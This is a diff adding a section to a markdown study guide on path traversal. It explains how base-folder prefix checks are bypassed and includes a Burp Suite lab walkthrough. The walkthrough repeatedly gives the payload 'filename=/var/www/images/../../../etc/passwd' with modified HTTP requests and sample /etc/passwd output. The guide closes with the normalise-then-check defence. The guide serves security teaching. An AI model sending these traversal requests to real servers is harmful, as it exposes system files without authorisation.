@@ -1458,3 +1458,363 @@ GET /image?filename=..%252f..%252f..%252fetc/passwd HTTP/2
 ```
 
 ---
+
+# Topic: Bypassing Base Folder Validation
+
+## The Problem
+
+Some applications try to prevent path traversal by checking that the filename starts with an expected directory.
+
+Example:
+
+```text id="e4y8mb"
+/var/www/images
+```
+
+The developer thinks:
+
+```text id="v8p6ki"
+"If every file starts with /var/www/images,
+the user can only access image files."
+```
+
+# Normal Request
+
+User requests:
+
+```text id="9t4u9r"
+filename=/var/www/images/218.png
+```
+
+Application checks:
+
+```text id="sdgzxk"
+Starts with /var/www/images ?
+```
+
+Result:
+
+```text id="lq5qls"
+YES ✓
+```
+
+The file is returned.
+
+
+# Vulnerable Check
+
+Suppose the application only verifies:
+
+```text id="5tzbvm"
+filename starts with:
+/var/www/images
+```
+
+but does not check the final resolved path.
+
+
+# Attacker Bypass
+
+The attacker supplies:
+
+```text id="4k8flv"
+filename=/var/www/images/../../../etc/passwd
+```
+
+Application checks:
+
+```text id="m6n8lj"
+Starts with /var/www/images ?
+```
+
+Result:
+
+```text id="95uqyz"
+YES ✓
+```
+
+The validation passes.
+
+
+# What Actually Happens?
+
+The operating system resolves:
+
+```text id="t8n5f7"
+/var/www/images/../../../etc/passwd
+```
+
+Step by step:
+
+```text id="qwb6tq"
+/var/www/images
+       ↑
+      ../
+/var/www
+       ↑
+      ../
+/var
+       ↑
+      ../
+/
+       ↓
+/etc/passwd
+```
+
+Final path:
+
+```text id="2w3b3j"
+/etc/passwd
+```
+
+
+# Visualization
+
+```text id="1epviy"
+Input:
+/var/www/images/../../../etc/passwd
+
+Validation:
+Starts with /var/www/images ?  ✓
+
+Filesystem Resolves:
+↓
+
+/etc/passwd
+```
+
+The application thinks it is accessing an image file, but the operating system accesses a sensitive system file.
+
+
+# Why Does This Work?
+
+The developer checks:
+
+```text id="uxzq0e"
+Raw Input
+```
+
+instead of:
+
+```text id="l4o7wv"
+Final Resolved Path
+```
+
+This is a common mistake.
+
+
+# Secure Validation
+
+### Bad
+
+```text id="7w2n2w"
+filename starts with
+/var/www/images
+```
+
+### Good
+
+1. Normalize the path.
+2. Resolve all `../` sequences.
+3. Check whether the final path is still inside:
+
+```text id="vccjwx"
+/var/www/images
+```
+
+If not:
+
+```text id="pr3mmo"
+Access Denied
+```
+
+
+# Example
+
+### User Input
+
+```text id="7g8q9h"
+/var/www/images/../../../etc/passwd
+```
+
+### Normalized Path
+
+```text id="w3p0r4"
+/etc/passwd
+```
+
+### Validation
+
+```text id="s03w2g"
+Is /etc/passwd inside
+/var/www/images ?
+```
+
+Result:
+
+```text id="tqyrxn"
+NO ✗
+```
+
+Request blocked.
+
+---
+
+# Path Traversal Using Absolute Path Prefix Bypass
+
+![lab1-](screenshots/labp5.png)
+
+
+## Step 1: Intercept a Product Image Request
+
+1. Open any product page.
+2. Click on a product image.
+3. In Burp Suite, go to:
+
+```text
+Proxy > HTTP History
+```
+
+4. Locate the image request.
+
+Example:
+
+```http
+GET /image?filename=218.png HTTP/2
+```
+
+
+## Step 2: Modify the Filename Parameter
+
+Replace:
+
+```http
+filename=218.png
+```
+
+with:
+
+```http
+filename=/var/www/images/../../../etc/passwd
+```
+
+Modified request:
+
+```http
+GET /image?filename=/var/www/images/../../../etc/passwd HTTP/2
+```
+
+## Step 3: Send the Request
+
+1. Forward the modified request.
+2. Observe the response.
+
+
+## Step 4: Read the File Contents
+
+The application returns the contents of:
+
+```text
+/etc/passwd
+```
+
+Example:
+
+```text
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+...
+```
+![lab1-](screenshots/labp5b.png)
+
+## Step 5: Lab Solved
+
+Successfully retrieving:
+
+```text
+/etc/passwd
+```
+
+solves the lab.
+
+![lab1-](screenshots/labp5s.png)
+
+
+# Why This Works
+
+Some applications validate that files start with:
+
+```text
+/var/www/images/
+```
+
+and assume they are safe.
+
+The payload begins with the expected directory:
+
+```text
+/var/www/images/
+```
+
+but then traverses back up the directory tree:
+
+```text
+../../../
+```
+
+Result:
+
+```text
+/var/www/images/../../../etc/passwd
+```
+
+Normalizes to:
+
+```text
+/etc/passwd
+```
+
+## Path Resolution
+
+### Supplied Path
+
+```text
+/var/www/images/../../../etc/passwd
+```
+
+### Directory Traversal
+
+```text
+/var/www/images/
+            ↑
+           ../
+            ↑
+           ../
+            ↑
+           ../
+```
+
+### Final Path
+
+```text
+/etc/passwd
+```
+
+# Request Example
+
+### Original Request
+
+```http
+GET /image?filename=218.png HTTP/2
+```
+
+### Modified Request
+
+```http
+GET /image?filename=/var/www/images/../../../etc/passwd HTTP/2
+```
+
+---
+
